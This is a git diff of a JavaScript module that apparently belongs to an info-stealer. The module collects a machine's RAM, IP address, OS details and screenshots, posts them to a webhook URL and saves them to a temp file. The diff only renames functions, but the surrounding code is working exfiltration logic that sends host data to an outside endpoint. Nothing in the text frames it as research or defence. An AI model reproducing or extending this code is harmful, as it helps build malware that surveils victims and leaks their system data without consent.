@@ -2,7 +2,8 @@ const os = require('os');
 
 const requests = require('../../utils/requests/requests.js');
 const fileutil = require('../../utils/fileutil/fileutil.js');
-const software = require('../../utils/software/software.js');
+
+const Software = require('../../utils/software/software.js');
 
 module.exports = async (webhookUrl) => {
     const {
@@ -20,12 +21,12 @@ module.exports = async (webhookUrl) => {
         RAM,
         IP,
         OS,
-    } = await software();
+    } = await Software();
 
     const screen = SCREENSHOTS ? SCREENSHOTS : null
 
     try {
-        await requests.webhook(webhookUrl, {
+        await requests.Webhook(webhookUrl, {
             embeds: [
                 {
                     title: 'System Information',
@@ -69,9 +70,9 @@ module.exports = async (webhookUrl) => {
         ];
 
         const WishTempDir = fileutil.WishTempDir('system');
-        await fileutil.writeDataToFile(WishTempDir, 'systemInfo.txt', systemInfo);
+        await fileutil.WriteDataToFile(WishTempDir, 'systemInfo.txt', systemInfo);
 
     } catch (error) {
         console.error(error);
     }
-}
+};
